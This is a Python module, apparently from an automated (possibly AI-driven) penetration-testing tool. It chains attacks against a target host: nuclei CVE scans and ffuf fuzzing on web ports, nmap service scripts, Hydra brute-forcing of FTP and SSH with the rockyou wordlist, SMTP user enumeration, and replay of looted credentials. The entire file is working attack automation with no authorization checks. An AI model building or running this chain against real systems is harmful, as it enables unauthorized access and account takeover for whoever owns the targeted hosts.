# /opt/ai_driver/modules/exploitation.py

import os
import json
from pathlib import Path
from modules.utils import run_command_with_log, get_target_dir
from modules.loot_tracker import add_loot, get_loot

COMMON_WEB_PORTS = {"80", "443", "8080", "8000", "8443"}
FFUF_WORDLIST = "/usr/share/seclists/Discovery/Web-Content/common.txt"
HYDRA_WORDLIST = "/usr/share/wordlists/rockyou.txt"
USER_WORDLIST = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
NUCLEI_TIMEOUT = 300
FFUF_TIMEOUT = 300
NMAP_SCRIPT_TIMEOUT = 180
ENUM_TIMEOUT = 180

def load_ports(target_dir):
    ports_file = Path(target_dir) / "exploitable_ports.json"
    if not ports_file.exists():
        return list(COMMON_WEB_PORTS)
    try:
        with open(ports_file) as f:
            data = json.load(f)
            if isinstance(data, list):
                ports = set(str(p) for p in data)
                return list(ports.union(COMMON_WEB_PORTS))
    except Exception as e:
        print(f"[!] Error reading exploitable_ports.json: {e}")
    return list(COMMON_WEB_PORTS)

def run_service_specific_scans(target, ports):
    service_scans = {
        "21": ["nmap", "-sV", "-p", "21", "--script=ftp*"],
        "22": ["nmap", "-sV", "-p", "22", "--script=ssh*"],
        "25": ["nmap", "-sV", "-p", "25", "--script=smtp*"],
        "53": ["nmap", "-sU", "-p", "53", "--script=dns*"],
    }
    for port in ports:
        if port in service_scans:
            command = service_scans[port] + [target]
            try:
                print(f"[>] Executing service-specific scan: {' '.join(command)}")
                run_command_with_log(command, timeout=NMAP_SCRIPT_TIMEOUT)
                add_loot(target, "protocol", f"{port}_service_scan")
            except Exception as e:
                print(f"[!] Service-specific scan failed for port {port}: {e}")

def run_web_exploitation(target, ports):
    for port in ports:
        if port in COMMON_WEB_PORTS:
            for scheme in ["http", "https"]:
                url = f"{scheme}://{target}:{port}"

                nuclei_cmd = [
                    "nuclei", "-u", url,
                    "-t", "cves/",
                    "-severity", "medium,high,critical",
                    "-json"
                ]
                try:
                    print(f"[>] Executing: {' '.join(nuclei_cmd)}")
                    run_command_with_log(nuclei_cmd, timeout=NUCLEI_TIMEOUT)
                    add_loot(target, "protocol", "http")
                except Exception as e:
                    print(f"[!] Nuclei scan failed for {url}: {e}")

                ffuf_cmd = [
                    "ffuf",
                    "-u", f"{url}/FUZZ",
                    "-w", FFUF_WORDLIST,
                    "-t", "25",
                    "-mc", "200,403"
                ]
                try:
                    print(f"[>] Executing: {' '.join(ffuf_cmd)}")
                    run_command_with_log(ffuf_cmd, timeout=FFUF_TIMEOUT)
                except Exception as e:
                    print(f"[!] FFUF scan failed for {url}: {e}")

def run_bruteforce_enumeration(target, ports):
    for port in ports:
        if port == "21":
            hydra_ftp = ["hydra", "-L", USER_WORDLIST, "-P", HYDRA_WORDLIST, f"ftp://{target}"]
            try:
                print(f"[>] Brute-forcing FTP with Hydra: {' '.join(hydra_ftp)}")
                run_command_with_log(hydra_ftp, timeout=ENUM_TIMEOUT)
                add_loot(target, "protocol", "ftp")
            except Exception as e:
                print(f"[!] Hydra FTP failed: {e}")

        elif port == "22":
            hydra_ssh = ["hydra", "-L", USER_WORDLIST, "-P", HYDRA_WORDLIST, f"ssh://{target}"]
            try:
                print(f"[>] Brute-forcing SSH with Hydra: {' '.join(hydra_ssh)}")
                run_command_with_log(hydra_ssh, timeout=ENUM_TIMEOUT)
                add_loot(target, "protocol", "ssh")
            except Exception as e:
                print(f"[!] Hydra SSH failed: {e}")

        elif port == "25":
            smtp_enum = ["smtp-user-enum", "-M", "VRFY", "-U", USER_WORDLIST, "-t", target]
            try:
                print(f"[>] Enumerating SMTP users: {' '.join(smtp_enum)}")
                run_command_with_log(smtp_enum, timeout=ENUM_TIMEOUT)
                add_loot(target, "protocol", "smtp")
            except Exception as e:
                print(f"[!] SMTP user enumeration failed: {e}")

        elif port == "53":
            dns_enum = ["dnsenum", target]
            try:
                print(f"[>] Running dnsenum: {' '.join(dns_enum)}")
                run_command_with_log(dns_enum, timeout=ENUM_TIMEOUT)
                add_loot(target, "protocol", "dns")
            except Exception as e:
                print(f"[!] DNS enumeration failed: {e}")

def run_credential_reuse(target, ports):
    usernames = get_loot(target, "username")
    passwords = get_loot(target, "password")
    if not usernames or not passwords:
        print("[~] No loot found for credential reuse.")
        return

    for port in ports:
        if port in ["21", "22"]:
            proto = "ftp" if port == "21" else "ssh"
            for user in usernames:
                for password in passwords:
                    reuse_cmd = ["hydra", "-l", user, "-p", password, f"{proto}://{target}"]
                    try:
                        print(f"[>] Reusing credentials on {proto.upper()} for {user}:{password}")
                        run_command_with_log(reuse_cmd, timeout=ENUM_TIMEOUT)
                        add_loot(target, "reused", f"{proto}:{user}:{password}")
                    except Exception as e:
                        print(f"[!] Reuse failed for {proto.upper()}: {e}")

def run_exploitation_chain(target, target_dir):
    print(f"[+] Starting exploitation chain for {target}")
    ports = load_ports(target_dir)

    run_web_exploitation(target, ports)
    run_service_specific_scans(target, ports)
    run_bruteforce_enumeration(target, ports)
    run_credential_reuse(target, ports)

    print(f"[âœ“] Exploitation chain completed for {target}")
